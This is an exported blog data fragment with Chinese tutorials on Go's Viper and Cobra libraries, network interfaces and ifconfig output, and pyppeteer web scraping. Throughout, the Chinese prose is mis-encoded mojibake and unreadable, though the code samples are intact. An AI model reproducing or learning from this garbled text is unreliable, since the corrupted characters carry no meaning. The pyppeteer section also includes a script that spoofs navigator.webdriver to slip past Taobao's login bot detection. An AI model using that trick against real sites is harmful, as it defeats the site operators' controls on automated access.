è®¿é—®åµŒå¥—é”®\n\nè®¿é—®æ–¹æ³•ä¹Ÿæ¥å—åµŒå¥—çš„é”®ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåŠ è½½äº†ä»¥ä¸‹JSONæ–‡ä»¶ï¼š\n\n```json\n{\n    \"host\": {\n        \"address\": \"localhost\",\n        \"port\": 5799\n    },\n    \"datastore\": {\n        \"metric\": {\n            \"host\": \"127.0.0.1\",\n            \"port\": 3099\n        },\n        \"warehouse\": {\n            \"host\": \"198.0.0.1\",\n            \"port\": 2112\n        }\n    }\n}\n```\n\n\nViperå¯ä»¥é€šè¿‡.åˆ†éš”ç¬¦æ¥è®¿é—®åµŒå¥—çš„å­—æ®µï¼š\n\n```go\nGetString(\"datastore.metric.host\") // (returns \"127.0.0.1\")\n```\n\n\nè¿™éµå®ˆå‰é¢ç¡®ç«‹çš„ä¼˜å…ˆè§„åˆ™; ä¼šæœç´¢è·¯å¾„ä¸­æ‰€æœ‰é…ç½®ï¼Œç›´åˆ°æ‰¾åˆ°ä¸ºæ­¢ã€‚\nä¾‹å¦‚ï¼Œä¸Šé¢çš„æ–‡ä»¶ï¼Œdatastore.metric.hostå’Œ datastore.metric.portéƒ½å·²ç»å®šä¹‰ï¼ˆå¹¶ä¸”å¯èƒ½è¢«è¦†ç›–ï¼‰ã€‚å¦‚æœå¦å¤– datastore.metric.protocolçš„é»˜è®¤å€¼ï¼ŒViperä¹Ÿä¼šæ‰¾åˆ°å®ƒã€‚\n\nä½†æ˜¯ï¼Œå¦‚æœdatastore.metricå€¼è¢«è¦†ç›–ï¼ˆé€šè¿‡æ ‡å¿—ï¼Œç¯å¢ƒå˜é‡ï¼ŒSetæ–¹æ³•ï¼Œ...ï¼‰ï¼Œåˆ™æ‰€æœ‰datastore.metricçš„å­é”®å°†ä¼šæœªå®šä¹‰ï¼Œå®ƒä»¬è¢«ä¼˜å…ˆçº§æ›´é«˜çš„é…ç½®å€¼æ‰€â€œé®è”½â€ã€‚\n\næœ€åï¼Œå¦‚æœå­˜åœ¨ç›¸åŒ¹é…çš„åµŒå¥—é”®ï¼Œåˆ™å…¶å€¼å°†è¢«è¿”å›ã€‚ä¾‹å¦‚ï¼š\n\n```json\n{\n    \"datastore.metric.host\": \"0.0.0.0\",\n    \"host\": {\n        \"address\": \"localhost\",\n        \"port\": 5799\n    },\n    \"datastore\": {\n        \"metric\": {\n            \"host\": \"127.0.0.1\",\n            \"port\": 3099\n        },\n        \"warehouse\": {\n            \"host\": \"198.0.0.1\",\n            \"port\": 2112\n        }\n    }\n}\n\nGetString(\"datastore.metric.host\") // returns \"0.0.0.0\"\n```\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ [Golangçš„é…ç½®ä¿¡æ¯å¤„ç†æ¡†æ¶Viper](https://blog.51cto.com/13599072/2072753)\n+ https://www.jishuwen.com/d/2vNk","tags":["viper"],"categories":["golang"]},{"title":"golangå‘½ä»¤è¡Œåº“cobraçš„ä½¿ç”¨","url":"%2Fp%2Fd50935d7.html","content":"\n### 0. å‰è¨€\n\nCobra(çœ¼é•œè›‡)æ˜¯ä¸€ä¸ªåº“ï¼Œå…¶æä¾›ç®€å•çš„æ¥å£æ¥åˆ›å»ºå¼ºå¤§ç°ä»£çš„CLIæ¥å£ï¼Œç±»ä¼¼äºgitæˆ–è€…goå·¥å…·ã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªåº”ç”¨ï¼Œç”¨æ¥ç”Ÿæˆä¸ªäººåº”ç”¨æ¡†æ¶ï¼Œä»è€Œå¼€å‘ä»¥Cobraä¸ºåŸºç¡€çš„åº”ç”¨ã€‚Dockeræºç ä¸­ä½¿ç”¨äº†Cobraã€‚\n\nCobraåŸºäºä¸‰ä¸ªåŸºæœ¬æ¦‚å¿µ`commands`,`arguments`å’Œ`flags`ã€‚å…¶ä¸­commandsä»£è¡¨è¡Œä¸ºï¼Œargumentsä»£è¡¨æ•°å€¼ï¼Œflagsä»£è¡¨å¯¹è¡Œä¸ºçš„æ”¹å˜ã€‚\n\nåŸºæœ¬æ¨¡å‹å¦‚ä¸‹ï¼š\n\n```bash\nAPPNAME COMMAND ARG --FLAG\n\n# hugoæ˜¯cmmands serveræ˜¯commandsï¼Œportæ˜¯flag\nhugo server --port=1313\n\n# cloneæ˜¯commandsï¼ŒURLæ˜¯argumentsï¼Œbraeæ˜¯flags\ngit clone URL --bare\n```\n\n\n<!-- more -->\n\n\n\n### 1. å®‰è£…å’Œä½¿ç”¨\n\nå®‰è£…:\n\n```bash\ngo get -u github.com/spf13/cobra/cobra\n```\n\n\n\nä½ çš„é¡¹ç›®ç»“æ„å¯èƒ½å¦‚ä¸‹:\n\n```bash\n  â–¾ appName/\n    â–¾ cmd/\n        root.go\n        version.go\n        commands.go\n      main.go\n```\n\n\n\n##### 1.1 main.go\n\nIn a Cobra app, typically the main.go file is very bare(è£¸éœ²). It serves one purpose: initializing Cobra.\n\n```go\npackage main\n\nimport (\n  \"appName/cmd\"\n)\n\nfunc main() {\n  cmd.Execute()\n}\n```\n\n\n\n##### 1.2 rootcmd\n\n```go\nvar rootCmd = &cobra.Command{\n  Use:   \"hugo\",\n  Short: \"Hugo is a very fast static site generator\",\n  Long: `A Fast and Flexible Static Site Generator built with\n                love by spf13 and friends in Go.\n                Complete documentation is available at http://hugo.spf13.com`,\n  Run: func(cmd *cobra.Command, args []string) {\n    // Do Stuff Here\n  },\n}\n\nfunc Execute() {\n  if err := rootCmd.Execute(); err != nil {\n    fmt.Println(err)\n    os.Exit(1)\n  }\n}\n```\n\n\n\n##### 1.3 additional commands\n\n```go\npackage cmd\n\nimport (\n  \"fmt\"\n\n  \"github.com/spf13/cobra\"\n)\n\nfunc init() {\n  rootCmd.AddCommand(versionCmd)\n}\n\nvar versionCmd = &cobra.Command{\n  Use:   \"version\",\n  Short: \"Print the version number of Hugo\",\n  Long:  `All software has versions. This is Hugo's`,\n  Run: func(cmd *cobra.Command, args []string) {\n    fmt.Println(\"Hugo Static Site Generator v0.9 -- HEAD\")\n  },\n}\n```\n\n\n\nå¯ä»¥ç®€å•æ‰§è¡Œä¸‹é¢å‘½ä»¤æŸ¥çœ‹æ•ˆæœ\n\n```bash\ngo run main.go help\ngo run main.go version\n```\n\n\n\n### 3. cobra ç”Ÿæˆå™¨\n\nåœ¨æ–‡ä»¶å¤¹github.com/spf13/cobra/cobraä¸‹ä½¿ç”¨go install, ç”Ÿæˆ cobraå‘½ä»¤\n\nå‘½ä»¤`cobra init [yourApp]`å°†ä¼šåˆ›å»ºåˆå§‹åŒ–åº”ç”¨ï¼ŒyourApp æ˜¯ä½ çš„é¡¹ç›®åç§°ã€‚å®ƒä¼šåœ¨ä½ çš„ GOPATH ç›®å½•ä¸‹é¢ç”Ÿæˆé¡¹ç›®ã€‚æœ€æ–°çš„æ“ä½œæ–¹å¼:\n\n```bash\ncd /Users/liuwei/golang/src/github.com/unix2dos/golangTest\ncobra init --pkg-name=github.com/unix2dos/golangTest yourApp\n```\n\n\n\næ¥ä¸‹æ¥æˆ‘ä»¬ç”¨`cobra add`æ¥æ·»åŠ ä¸€äº›å­å‘½ä»¤ã€‚åœ¨ä½ é¡¹ç›®çš„ç›®å½•ä¸‹ï¼Œè¿è¡Œä¸‹é¢è¿™äº›å‘½ä»¤ï¼š\n\n```bash\ncobra add serve\ncobra add config\ncobra add create -p 'configCmd'\n```\n\nè¿™æ ·ä»¥åï¼Œä½ å°±å¯ä»¥è¿è¡Œä¸Šé¢é‚£äº› app serve ä¹‹ç±»çš„å‘½ä»¤äº†ã€‚é¡¹ç›®ç›®å½•å¦‚ä¸‹ï¼š\n\n```bash\nâ–¾ app/\n  â–¾ cmd/\n      serve.go\n      config.go\n      create.go\n    main.go\n```\n\n\n\n### 4. ä½¿ç”¨Flags\n\ncobra æœ‰ä¸¤ç§ flagï¼Œä¸€ä¸ªæ˜¯å…¨å±€å˜é‡ï¼Œä¸€ä¸ªæ˜¯å±€éƒ¨å˜é‡ã€‚å…¨å±€ä»€ä¹ˆæ„æ€å‘¢ï¼Œå°±æ˜¯æ‰€ä»¥å­å‘½ä»¤éƒ½å¯ä»¥ç”¨ã€‚å±€éƒ¨çš„åªæœ‰è‡ªå·±èƒ½ç”¨ã€‚å…ˆçœ‹å…¨å±€çš„ï¼š\n\n```go\nRootCmd.PersistentFlags().StringVar(&cfgFile, \"config\", \"\", \"config file (default is $HOME/.cobra_exp1.yaml)\")\n```\n\nåœ¨çœ‹å±€éƒ¨çš„ï¼š\n\n```go\nRootCmd.Flags().BoolP(\"toggle\", \"t\", false, \"Help message for toggle\")\n```\n\nåŒºåˆ«å°±åœ¨ RootCmd åé¢çš„æ˜¯ Flags è¿˜æ˜¯ PersistentFlagsã€‚\n\n\n\n### 5. å‚è€ƒèµ„æ–™\n\n+ [Golangä¹‹ä½¿ç”¨Cobra](https://o-my-chenjian.com/2017/09/20/Using-Cobra-With-Golang/)\n\n+ https://www.kancloud.cn/liupengjie/go/1010466","tags":["cobra"],"categories":["golang"]},{"title":"ç½‘ç»œæ¥å£ä»‹ç»","url":"%2Fp%2F9dad86f4.html","content":"\n### 1. ç½‘ç»œæ¥å£ä»‹ç»\n\n##### 1.1 ç½‘ç»œæ¥å£çš„å‘½å\n\nç½‘ç»œæ¥å£å¹¶ä¸å­˜åœ¨ä¸€å®šçš„å‘½åè§„èŒƒï¼Œä½†ç½‘ç»œæ¥å£åå­—çš„å®šä¹‰ä¸€èˆ¬éƒ½æ˜¯è¦æœ‰æ„ä¹‰çš„ã€‚ä¾‹å¦‚ï¼š\n\n+ eth0: ethernetçš„ç®€å†™ï¼Œä¸€èˆ¬ç”¨äºä»¥å¤ªç½‘æ¥å£ã€‚\n\n+ wifi0:wifiæ˜¯æ— çº¿å±€åŸŸç½‘ï¼Œå› æ­¤wifi0ä¸€èˆ¬æŒ‡æ— çº¿ç½‘ç»œæ¥å£ã€‚\n\n+ ath0: Atherosçš„ç®€å†™ï¼Œä¸€èˆ¬æŒ‡AtherosèŠ¯ç‰‡æ‰€åŒ…å«çš„æ— çº¿ç½‘ç»œæ¥å£ã€‚\n\n+ lo: localçš„ç®€å†™ï¼Œä¸€èˆ¬æŒ‡æœ¬åœ°ç¯å›æ¥å£ã€‚\n\n<!-- more -->\n\n##### 1.2 ç½‘ç»œæ¥å£å¦‚ä½•å·¥ä½œ\n\nç½‘ç»œæ¥å£æ˜¯ç”¨æ¥å‘é€å’Œæ¥å—æ•°æ®åŒ…çš„åŸºæœ¬è®¾å¤‡ã€‚\n\nç³»ç»Ÿä¸­çš„æ‰€æœ‰ç½‘ç»œæ¥å£ç»„æˆä¸€ä¸ªé“¾çŠ¶ç»“æ„ï¼Œåº”ç”¨å±‚ç¨‹åºä½¿ç”¨æ—¶æŒ‰åç§°è°ƒç”¨ã€‚\n\næ¯ä¸ªç½‘ç»œæ¥å£åœ¨linuxç³»ç»Ÿä¸­å¯¹åº”äºä¸€ä¸ªstruct net_deviceç»“æ„ä½“ï¼ŒåŒ…å«name,mac,mask,mtuâ€¦ä¿¡æ¯ã€‚\n\næ¯ä¸ªç¡¬ä»¶ç½‘å¡(ä¸€ä¸ªMAC)å¯¹åº”ä¸€ä¸ªç½‘ç»œæ¥å£ï¼Œå…¶å·¥ä½œå®Œå…¨ç”±ç›¸åº”çš„é©±åŠ¨ç¨‹åºæ§åˆ¶ã€‚\n\n##### 1.3 è™šæ‹Ÿç½‘ç»œæ¥å£\n\nè™šæ‹Ÿç½‘ç»œæ¥å£çš„åº”ç”¨èŒƒå›´éå¸¸å¹¿æ³›ã€‚æœ€ç€åçš„å½“å±â€œloâ€äº†ï¼ŒåŸºæœ¬ä¸Šæ¯ä¸ªlinuxç³»ç»Ÿéƒ½æœ‰è¿™ä¸ªæ¥å£ã€‚\n\nè™šæ‹Ÿç½‘ç»œæ¥å£å¹¶ä¸çœŸå®åœ°ä»å¤–ç•Œæ¥æ”¶å’Œå‘é€æ•°æ®åŒ…ï¼Œè€Œæ˜¯åœ¨ç³»ç»Ÿå†…éƒ¨æ¥æ”¶å’Œå‘é€æ•°æ®åŒ…ï¼Œå› æ­¤è™šæ‹Ÿç½‘ç»œæ¥å£ä¸éœ€è¦é©±åŠ¨ç¨‹åºã€‚\n\nè™šæ‹Ÿç½‘ç»œæ¥å£å’ŒçœŸå®å­˜åœ¨çš„ç½‘ç»œæ¥å£åœ¨ä½¿ç”¨ä¸Šæ˜¯ä¸€è‡´çš„ã€‚\n\n##### 1.4 ç½‘ç»œæ¥å£çš„åˆ›å»º\n\nç¡¬ä»¶ç½‘å¡çš„ç½‘ç»œæ¥å£ç”±é©±åŠ¨ç¨‹åºåˆ›å»ºã€‚è€Œè™šæ‹Ÿçš„ç½‘ç»œæ¥å£ç”±ç³»ç»Ÿåˆ›å»ºæˆ–é€šè¿‡åº”ç”¨å±‚ç¨‹åºåˆ›å»ºã€‚\n\né©±åŠ¨ä¸­åˆ›å»ºç½‘ç»œæ¥å£çš„å‡½æ•°æ˜¯ï¼š`register_netdev(struct net_device *)`æˆ–è€…`register_netdevice(struct net_device *)`ã€‚\n\nè¿™ä¸¤ä¸ªå‡½æ•°çš„åŒºåˆ«æ˜¯ï¼šregister_netdev(â€¦)ä¼šè‡ªåŠ¨ç”Ÿæˆä»¥â€ethâ€ä½œä¸ºæ‰“å¤´åç§°çš„æ¥å£ï¼Œè€Œregister_netdevice(â€¦)éœ€è¦æå‰æŒ‡å®šæ¥å£åç§°.äº‹å®ä¸Šï¼Œregister_netdev(â€¦)ä¹Ÿæ˜¯é€šè¿‡è°ƒç”¨register_netdevice(â€¦)å®ç°çš„ã€‚\n\n\n\n### 2. macçš„ç½‘ç»œæ¥å£\n\n- lo0 = loopback > å›ç¯æ¥å£æˆ–è€… æœ¬åœ°ä¸»æœº(localhost)\n- gif0 = Software Network Interface > é€šç”¨ IP-in-IPéš§é“(RFC2893)\n- stf0 = 6to4 tunnel interface > 6to4è¿æ¥(RFC3056)\n- en0 = Ethernet 0 > ä»¥å¤ªç½‘æˆ–802.11æ¥å£\n- fw0 = Firewire > IP over FireWire(IEEE-1394), macOSç‰¹æœ‰\n- en1 = Ethernet 1 > \n- vmnet8 = Virtual Interface > è™šæ‹Ÿç½‘å¡8\n- vmnet1 = Virtual Interface > è™šæ‹Ÿç½‘å¡1\n- p2p Point-to-Point åè®®\n- awdl airdrop peer to peer(ä¸€ç§mesh network), apple airdropè®¾å¤‡ç‰¹æœ‰\n- bridge ç¬¬2å±‚æ¡¥æ¥\n- vlan è™šæ‹Ÿå±€åŸŸç½‘ç»œ\n\nåœ¨iOSè®¾å¤‡(æ”¯æŒcellular)ä¸Šè¿˜èƒ½çœ‹åˆ°\n\n+ pdp_ip èœ‚çªæ•°æ®è¿æ¥\n\né‚£en0 en1 en2 en3 en4 æ€ä¹ˆè¿™ä¹ˆå¤šï¼Ÿï¼Ÿï¼Ÿ è¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼š \n\n```bash\nnetworksetup -listallhardwareports\n\nHardware Port: Wi-Fi\nDevice: en0\nEthernet Address: c4:b3:01:bd:ad:1d\n\nHardware Port: Bluetooth PAN\nDevice: en3\nEthernet Address: c4:b3:01:bd:ad:1e\n\nHardware Port: Thunderbolt 1\nDevice: en1\nEthernet Address: 4a:00:07:4d:b2:b0\n\nHardware Port: Thunderbolt 2\nDevice: en2\nEthernet Address: 4a:00:07:4d:b2:b1\n\nHardware Port: Thunderbolt Bridge\nDevice: bridge0\nEthernet Address: 4a:00:07:4d:b2:b0\n```\n\nåŸæ¥æ˜¯Wi-Fiï¼Œè“ç‰™ï¼Œthunderboltâ€¦\n\n\n\n### 3. ifconfig å‘½ä»¤\n\n```bash\n[root@localhost ~]# ifconfig\neth0      Link encap:Ethernet  HWaddr 00:50:56:BF:26:20  \n          inet addr:192.168.120.204  Bcast:192.168.120.255  Mask:255.255.255.0\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:8700857 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:31533 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:596390239 (568.7 MiB)  TX bytes:2886956 (2.7 MiB)\n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n          RX packets:68 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:68 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:2856 (2.7 KiB)  TX bytes:2856 (2.7 KiB)\n```\n\nç¬¬ä¸€è¡Œï¼šè¿æ¥ç±»å‹ï¼šEthernetï¼ˆä»¥å¤ªç½‘ï¼‰HWaddrï¼ˆç¡¬ä»¶macåœ°å€ï¼‰\n\nç¬¬äºŒè¡Œï¼šç½‘å¡çš„IPåœ°å€ã€å­ç½‘ã€æ©ç \n\nç¬¬ä¸‰è¡Œï¼šUPï¼ˆä»£è¡¨ç½‘å¡å¼€å¯çŠ¶æ€ï¼‰RUNNINGï¼ˆä»£è¡¨ç½‘å¡çš„ç½‘çº¿è¢«æ¥ä¸Šï¼‰MULTICASTï¼ˆæ”¯æŒç»„æ’­ï¼‰MTU:1500ï¼ˆæœ€å¤§ä¼ è¾“å•å…ƒï¼‰ï¼š1500å­—èŠ‚\n\nç¬¬å››ã€äº”è¡Œï¼šæ¥æ”¶ã€å‘é€æ•°æ®åŒ…æƒ…å†µç»Ÿè®¡\n\nç¬¬ä¸ƒè¡Œï¼šæ¥æ”¶ã€å‘é€æ•°æ®å­—èŠ‚æ•°ç»Ÿè®¡ä¿¡æ¯ã€‚\n\n\n\nå…¶ä»–è¯´æ˜:\n\n+ eth0 è¡¨ç¤ºç¬¬ä¸€å—ç½‘å¡ï¼Œ å…¶ä¸­ HWaddr è¡¨ç¤ºç½‘å¡çš„ç‰©ç†åœ°å€ï¼Œå¯ä»¥çœ‹åˆ°ç›®å‰è¿™ä¸ªç½‘å¡çš„ç‰©ç†åœ°å€(MACåœ°å€ï¼‰æ˜¯ 00:50:56:BF:26:20\n\n+ inet addr ç”¨æ¥è¡¨ç¤ºç½‘å¡çš„IPåœ°å€ï¼Œæ­¤ç½‘å¡çš„ IPåœ°å€æ˜¯ 192.168.120.204ï¼Œå¹¿æ’­åœ°å€ï¼Œ Bcast:192.168.120.255ï¼Œæ©ç åœ°å€Mask:255.255.255.0 \n\n+ lo æ˜¯è¡¨ç¤ºä¸»æœºçš„å›ååœ°å€ï¼Œè¿™ä¸ªä¸€èˆ¬æ˜¯ç”¨æ¥æµ‹è¯•ä¸€ä¸ªç½‘ç»œç¨‹åºï¼Œä½†åˆä¸æƒ³è®©å±€åŸŸç½‘æˆ–å¤–ç½‘çš„ç”¨æˆ·èƒ½å¤ŸæŸ¥çœ‹ï¼Œåªèƒ½åœ¨æ­¤å°ä¸»æœºä¸Šè¿è¡Œå’ŒæŸ¥çœ‹æ‰€ç”¨çš„ç½‘ç»œæ¥å£ã€‚æ¯”å¦‚æŠŠ HTTPDæœåŠ¡å™¨çš„æŒ‡å®šåˆ°å›ååœ°å€ï¼Œåœ¨æµè§ˆå™¨è¾“å…¥ 127.0.0.1 å°±èƒ½çœ‹åˆ°ä½ æ‰€æ¶WEBç½‘ç«™äº†ã€‚ä½†åªæ˜¯æ‚¨èƒ½çœ‹å¾—åˆ°ï¼Œå±€åŸŸç½‘çš„å…¶å®ƒä¸»æœºæˆ–ç”¨æˆ·æ— ä»çŸ¥é“ã€‚\n\n\n\n### 4. å‚è€ƒèµ„æ–™\n\n+ [Linuxä¸­çš„loå›ç¯æ¥å£è¯¦ç»†ä»‹ç»](https://blog.csdn.net/huguohu2006/article/details/7261106)\n\n+ [ifconfigå‘½ä»¤](http://www.voidcn.com/article/p-ehcsampr-bmr.html)\n\n+ [ifconfig output in Mac OS X?](https://superuser.com/questions/267660/can-someone-please-explain-ifconfig-output-in-mac-os-x)\n","tags":["ç½‘ç»œæ¥å£"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"pythonçˆ¬è™«åˆ©å™¨pyppeteerçš„ä½¿ç”¨","url":"%2Fp%2F6b1ba1b4.html","content":"\n\n\n### 0. å‰è¨€\n\nChrome59(linuxã€macos)ã€ Chrome60(windows)ä¹‹åï¼ŒChromeè‡ªå¸¦[headless(æ— ç•Œé¢)æ¨¡å¼](https://developers.google.com/web/updates/2017/04/headless-chrome)å¾ˆæ–¹ä¾¿åšè‡ªåŠ¨åŒ–æµ‹è¯•æˆ–è€…çˆ¬è™«ã€‚ä½†æ˜¯å¦‚ä½•å’Œheadlessæ¨¡å¼çš„Chromeäº¤äº’åˆ™æ˜¯ä¸€ä¸ªé—®é¢˜ã€‚é€šè¿‡å¯åŠ¨Chromeæ—¶çš„å‘½ä»¤è¡Œå‚æ•°ä»…èƒ½å®ç°ç®€æ˜“çš„å¯åŠ¨æ—¶åˆå§‹åŒ–æ“ä½œã€‚Seleniumã€Webdriverç­‰æ˜¯ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œä½†æ˜¯å¾€å¾€ä¾èµ–ä¼—å¤šï¼Œä¸å¤Ÿæ‰å¹³ã€‚\n\n\n\npuppeteeræ˜¯è°·æ­Œå®˜æ–¹å‡ºå“çš„ä¸€ä¸ªé€šè¿‡DevToolsåè®®æ§åˆ¶headless Chromeçš„Nodeåº“ã€‚å¯ä»¥é€šè¿‡puppeteerçš„æä¾›çš„apiç›´æ¥æ§åˆ¶Chromeæ¨¡æ‹Ÿå¤§éƒ¨åˆ†ç”¨æˆ·æ“ä½œæ¥è¿›è¡ŒUI Testæˆ–è€…ä½œä¸ºçˆ¬è™«è®¿é—®é¡µé¢æ¥æ”¶é›†æ•°æ®ã€‚\n\n\n\npyperteeræ˜¯puppeteerçš„Pythonå®ç°ï¼Œç›¸æ¯”äºseleniumå…·æœ‰å¼‚æ­¥åŠ è½½ã€é€Ÿåº¦å¿«ã€å…·å¤‡æœ‰ç•Œé¢/æ— ç•Œé¢æ¨¡å¼ã€ä¼ªè£…æ€§æ›´å¼ºä¸æ˜“è¢«è¯†åˆ«ä¸ºæœºå™¨äººåŒæ—¶å¯ä»¥ä¼ªè£…æ‰‹æœºå¹³æ¿ç­‰ç»ˆç«¯ï¼›ä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›ç¼ºç‚¹ï¼Œå¦‚æ¥å£ä¸æ˜“ç†è§£ã€è¯­ä¹‰æ™¦æ¶©ï¼›\n\n<!-- more -->\n\n\n\n### 1. pyppeteerä½¿ç”¨\n\n```bash\npip3 install pyppeteer\n```\n\n\n\n\n\n##### 1.1 æ— å¤´æ¨¡å¼\n\n```python\nbrowser = await launch({'headless': False, 'args': ['--no-sandbox']})\n```\n\nheadless=True, ä¸å¼¹å‡ºæµè§ˆå™¨, æµ‹è¯•é˜¶æ®µå¯ä»¥è®¾ç½®ä¸º False è§‚æµ‹\n\n##### 1.2 pageæ–¹æ³•\n\n```bash\npage.click ç‚¹å‡»\npage.type è¾“å…¥\npage.select ä¸‹æ‹‰æ¡†\n\n\npage.click('.rfm input[name=\"cookietime\"]')\n```\n\nå¯¹äº pageæ–¹æ³•å†…çš„é€‰æ‹©å…ƒç´ è¯­æ³•è¯·å‚è€ƒ:  https://www.w3schools.com/cssref/css_selectors.asp\n\n\n\n### 2. pyppeteer  linuxè¿è¡Œé—®é¢˜\n\n##### 2.1 centosæ— æ³•è¿è¡Œpyppeteer\n\n```\nyum -y install libX11 libXcomposite libXcursor libXdamage libXext libXi libXtst cups-libs libXScrnSaver libXrandr alsa-lib pango atk at-spi2-atk gtk3 \n```\n\n\n\n##### 2.2 Bad NaCl helper startup ack\n\n```\nERROR:nacl_fork_delegate_linux.cc(314)] Bad NaCl helper startup ack (0 bytes)\\n\\n(chrome:24935)\n```\n\nä½¿ç”¨æ— å¤´æ¨¡å¼\n\n\n\n##### 2.3 Navigation Timeout Exceeded: 30000 ms exceeded\n\n```\nawait page.goto(\"https://www.baidu.com\", timeout=0)\n```\n\n+ åŠ ä¸Štimeout\n\n+ æ£€æµ‹å°ç¦ ip\n\n\n\n\n\n### 3. pyppeteer é—®é¢˜è§£å†³æ–¹æ¡ˆ\n\n##### 3.1 æŠ“å–js æ¸²æŸ“åçš„æ•°æ®\n\nä½¿ç”¨ requests æ˜¯æ— æ³•æ­£å¸¸æŠ“å–åˆ°ç›¸å…³æ•°æ®çš„ã€‚å› ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºè¿™ä¸ªé¡µé¢æ˜¯ JavaScript æ¸²æŸ“è€Œæˆçš„ï¼Œæˆ‘ä»¬æ‰€çœ‹åˆ°çš„å†…å®¹éƒ½æ˜¯ç½‘é¡µåŠ è½½ååˆæ‰§è¡Œäº† JavaScript ä¹‹åæ‰å‘ˆç°å‡ºæ¥çš„ï¼Œå› æ­¤è¿™äº›æ¡ç›®æ•°æ®å¹¶ä¸å­˜åœ¨äºåŸå§‹ HTML ä»£ç ä¸­ï¼Œè€Œ requests ä»…ä»…æŠ“å–çš„æ˜¯åŸå§‹ HTML ä»£ç ã€‚\n\nå¥½çš„ï¼Œæ‰€ä»¥é‡åˆ°è¿™ç§ç±»å‹çš„ç½‘ç«™æˆ‘ä»¬åº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ\n\nå…¶å®ç­”æ¡ˆæœ‰å¾ˆå¤šï¼š\n\n- åˆ†æç½‘é¡µæºä»£ç æ•°æ®ï¼Œå¦‚æœæ•°æ®æ˜¯éšè—åœ¨ HTML ä¸­çš„å…¶ä»–åœ°æ–¹ï¼Œä»¥ JavaScript å˜é‡çš„å½¢å¼å­˜åœ¨ï¼Œç›´æ¥æå–å°±å¥½äº†ã€‚\n- åˆ†æ Ajaxï¼Œå¾ˆå¤šæ•°æ®å¯èƒ½æ˜¯ç»è¿‡ Ajax è¯·æ±‚æ—¶å€™è·å–çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ†æå…¶æ¥å£ã€‚\n- æ¨¡æ‹Ÿ JavaScript æ¸²æŸ“è¿‡ç¨‹ï¼Œç›´æ¥æŠ“å–æ¸²æŸ“åçš„ç»“æœã€‚\n\n\n\nè€Œ Pyppeteer å’Œ Selenium å°±æ˜¯ç”¨çš„ç¬¬ä¸‰ç§æ–¹æ³•ï¼Œä¸‹é¢æˆ‘ä»¬å†ç”¨ Pyppeteer æ¥è¯•è¯•ï¼Œå¦‚æœç”¨ Pyppeteer å®ç°å¦‚ä¸Šé¡µé¢çš„æŠ“å–çš„è¯ï¼Œä»£ç å°±å¯ä»¥å†™ä¸ºå¦‚ä¸‹å½¢å¼ï¼š\n\n```python\nimport asyncio\nfrom pyppeteer import launch\nfrom pyquery import PyQuery as pq\n\nasync def main():\n    browser = await launch()\n    page = await browser.newPage()\n    await page.goto('http://quotes.toscrape.com/js/')\n    doc = pq(await page.content())\n    print('Quotes:', doc('.quote').length)\n    await browser.close()\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n##### 3.2 webdriver æ£€æµ‹é—®é¢˜\n\næœ‰äº›ç½‘ç«™è¿˜æ˜¯ä¼šæ£€æµ‹åˆ°æ˜¯ webdriver å§ï¼Œæ¯”å¦‚æ·˜å®æ£€æµ‹åˆ°æ˜¯ webdriver å°±ä¼šç¦æ­¢ç™»å½•äº†\n\nå…¶å®æ·˜å®ä¸»è¦é€šè¿‡ window.navigator.webdriver æ¥å¯¹ webdriver è¿›è¡Œæ£€æµ‹ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä½¿ç”¨ JavaScript å°†å®ƒè®¾ç½®ä¸º false å³å¯ï¼Œä»£ç å¦‚ä¸‹ï¼š\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch(headless=False, args=['--disable-infobars'])\n    page = await browser.newPage()\n    await page.goto('https://login.taobao.com/member/login.jhtml?redirectURL=https://www.taobao.com/')\n    await page.evaluate(\n        '''() =>{ Object.defineProperties(navigator,{ webdriver:{ get: () => false } }) }''')\n    await asyncio.sleep(100)\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n##### 3.3 ä¿æŒç”¨æˆ·è®°å½•\n\nå¾ˆå¤šæœ‹å‹åœ¨æ¯æ¬¡å¯åŠ¨ Selenium æˆ– Pyppeteer çš„æ—¶å€™æ€»æ˜¯æ˜¯ä¸€ä¸ªå…¨æ–°çš„æµè§ˆå™¨ï¼Œé‚£å°±æ˜¯æ²¡æœ‰è®¾ç½®ç”¨æˆ·ç›®å½•ï¼Œå¦‚æœè®¾ç½®äº†å®ƒï¼Œæ¯æ¬¡æ‰“å¼€å°±ä¸å†æ˜¯ä¸€ä¸ªå…¨æ–°çš„æµè§ˆå™¨äº†ï¼Œå®ƒå¯ä»¥æ¢å¤ä¹‹å‰çš„å†å²è®°å½•ï¼Œä¹Ÿå¯ä»¥æ¢å¤å¾ˆå¤šç½‘ç«™çš„ç™»å½•ä¿¡æ¯ã€‚é‚£ä¹ˆè¿™ä¸ªæ€ä¹ˆæ¥åšå‘¢ï¼Ÿå¾ˆç®€å•ï¼Œåœ¨å¯åŠ¨çš„æ—¶å€™è®¾ç½® userDataDir å°±å¥½äº†ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch(headless=False, userDataDir='./userdata', args=['--disable-infobars'])\n    page = await browser.newPage()\n    await page.goto('https://www.taobao.com')\n    await asyncio.sleep(100)\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n### 4. 